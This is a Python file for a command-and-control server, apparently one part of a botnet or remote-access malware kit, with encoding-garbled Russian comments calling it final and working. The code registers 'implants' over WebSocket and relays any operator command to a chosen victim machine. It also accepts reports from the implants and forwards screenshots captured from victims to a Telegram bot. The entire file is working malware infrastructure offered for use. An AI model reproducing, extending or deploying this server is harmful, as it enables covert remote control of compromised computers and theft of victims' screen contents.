# --- –§–ê–ô–õ: c2_server.py (–§–∏–Ω–∞–ª—å–Ω—ã–π, –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π, —Ä–∞–±–æ—á–∏–π) ---
# –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∞ —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω–∞—è –æ—à–∏–±–∫–∞: —Å–µ—Ä–≤–µ—Ä —Ç–µ–ø–µ—Ä—å –ø–µ—Ä–µ—Å—ã–ª–∞–µ—Ç –í–°–ï —Ç–∏–ø—ã —Å–æ–æ–±—â–µ–Ω–∏–π.

import asyncio, json, os, threading, base64
import requests
from aiohttp import web
import settings

IMPLANTS, OPERATOR = {}, None

def send_telegram_photo(caption, photo_data):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç base64 –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ Telegram."""
    def send():
        try:
            image_bytes = base64.b64decode(photo_data)
            files = {'photo': ('screenshot.jpg', image_bytes, 'image/jpeg')}
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendPhoto"
            data = {'chat_id': settings.CHAT_ID, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=20)
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        bot_list = [{'id': bot_id} for bot_id in IMPLANTS.keys()]
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list})

async def report_handler(request):
    """–ü—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–æ–Ω–µ—Å–µ–Ω–∏—è –æ—Ç –∏–º–ø–ª–∞–Ω—Ç–æ–≤ –ø–æ HTTP POST."""
    try:
        data = await request.json()
        bot_id = data.get('bot_id')
        print(f"[+] –ü–æ–ª—É—á–µ–Ω –æ—Ç—á–µ—Ç –æ—Ç {bot_id} (—Ç–∏–ø: {data.get('type')})")

        if data.get('type') == 'screenshot_result' and data.get('data'):
            send_telegram_photo(f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç –æ—Ç {bot_id}", data['data'])

        if OPERATOR and not OPERATOR.closed:
            await OPERATOR.send_json(data)

        return web.Response(status=200)
    except Exception:
        return web.Response(status=500)

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)
    client_type, client_id = None, None

    try:
        initial_msg = await ws.receive_json(timeout=30.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws; print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è."); await broadcast_bot_list()
        elif client_type == 'implant' and 'id' in initial_msg:
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = ws; print(f"[+] –ò–º–ø–ª–∞–Ω—Ç –Ω–∞ —Å–≤—è–∑–∏: {client_id}"); await broadcast_bot_list()
        else:
            await ws.close(); return ws

        async for msg in ws:
            if msg.type != web.WSMsgType.TEXT or msg.data == 'pong': continue
            try: data = json.loads(msg.data)
            except: continue

            if client_type == 'operator':
                target_id = data.get('target_id')
                if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
                    # <<< –ì–õ–ê–í–ù–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –¢–£–ü–ê–Ø –ü–ï–†–ï–°–´–õ–ö–ê >>>
                    # –¢–µ–ø–µ—Ä—å –º—ã –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –õ–Æ–ë–û–ï —Å–æ–æ–±—â–µ–Ω–∏–µ, –∞ –Ω–µ —Ç–æ–ª—å–∫–æ 'command'.
                    # –ï—Å–ª–∏ —ç—Ç–æ –∫–æ–º–∞–Ω–¥–∞ - –∏–º–ø–ª–∞–Ω—Ç –ø–æ–ª—É—á–∏—Ç {'type':'command', 'payload':{...}}
                    # –ï—Å–ª–∏ —ç—Ç–æ –∑–∞–ø—Ä–æ—Å –¥–µ—Ç–∞–ª–µ–π - {'type':'get_details', 'target_id':'...'}
                    # –ò–º–ø–ª–∞–Ω—Ç –∑–Ω–∞–µ—Ç, –∫–∞–∫ —ç—Ç–æ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å.
                    await IMPLANTS[target_id].send_json(data)

    except Exception: pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]; print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}"); await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None; print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
    return ws

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)
app.router.add_post('/report', report_handler)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print(f"====== C2 SERVER (–ö—Ä–µ–ø–æ—Å—Ç—å) ONLINE –Ω–∞ –ø–æ—Ä—Ç—É {port} ======")
    web.run_app(app, host='0.0.0.0', port=port)
